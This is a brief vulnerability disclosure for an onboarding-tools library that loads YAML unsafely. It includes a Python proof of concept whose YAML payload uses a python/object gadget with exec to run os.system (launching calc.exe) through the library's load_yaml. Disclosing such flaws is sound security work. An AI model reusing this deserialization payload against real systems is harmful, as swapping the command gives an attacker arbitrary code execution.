# Description

`Onboarding Tools` hosts a set of libraries and command line tool for automating parts of the onboarding workflow. It gives the user the ability to apply rule-based mapping automation, ingestion of multiple source files, review loadsheet consistency, and validate entity definitions against a pre-defined ontology (consistent with Google's Digital Facilities), which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```python
import programs.ontology.ontology as ontology

payload = """
cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
open('config.yml','w+').write(payload)

ontology.load_yaml('config.yml')
```
* `python3 exploit.py`



# Impact

Arbitary Code Execution
